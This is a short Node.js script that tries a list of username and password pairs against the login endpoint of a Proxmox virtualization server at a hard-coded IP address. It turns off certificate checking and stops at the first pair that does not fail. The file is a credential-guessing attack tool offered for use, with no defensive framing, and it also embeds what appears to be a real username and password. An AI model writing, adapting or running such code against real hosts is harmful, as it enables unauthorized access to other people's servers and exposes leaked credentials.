const https = require("https")
const data = new FormData();
data.append('username', 'noerror');
data.append('password', 'H1lboEEDiul3bp2M');
data.append('realm', 'pam');
data.append('new-format', '1');

const usernames = ['user1', 'user2', 'user3']; // Array of usernames to check
const passwords = ['pass1', 'pass2', 'pass3']; // Array of passwords to check

async function checkCredentials() {
    for (let i = 0; i < usernames.length; i++) {
        data.set('username', usernames[i]);
        data.set('password', passwords[i]);

        const response = await fetch("http://199.127.62.186:8006/api2/extjs/access/ticket", {
            method: "POST",
            body: data,
            agent: new https.Agent({ rejectUnauthorized: false }) // Add this line
        });

        if (response.status !== 401) {
            console.log(`Valid credentials found - Username: ${usernames[i]}, Password: ${passwords[i]}`);
            break;
        }
    }
}

checkCredentials();
